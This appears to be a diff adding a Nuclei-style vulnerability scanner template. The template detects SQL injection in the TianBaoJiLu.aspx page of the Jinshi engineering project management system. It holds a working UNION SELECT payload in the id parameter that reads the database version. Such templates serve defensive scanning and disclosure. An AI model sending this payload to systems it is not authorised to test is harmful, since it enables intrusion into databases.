@@ -1,0 +1,55 @@
+id: poc-yaml-jinshi-engineering-project-management-software
+info:
+  name: "金石工程项目管理系统 TianBaoJiLu.aspx SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: initial-request
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "ASP.NET_SessionId"
+    extractors:
+      - type: regex
+        name: session_id
+        internal: true
+        part: header
+        regex:
+          - "ASP.NET_SessionId=(.*?);"
+
+  - id: sqli-detection
+    method: GET
+    path:
+      - "{{BaseURL}}/query/shigongjihuajindu/TianBaoJiLu.aspx?id=1+Union+Select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,@@version,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43+"
+    headers:
+      Cookie: "ASP.NET_SessionId={{session_id}};"
+      Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "microsoft sql server"
+          - "Corporation"
+      - type: word
+        part: header
+        words:
+          - "text/html"
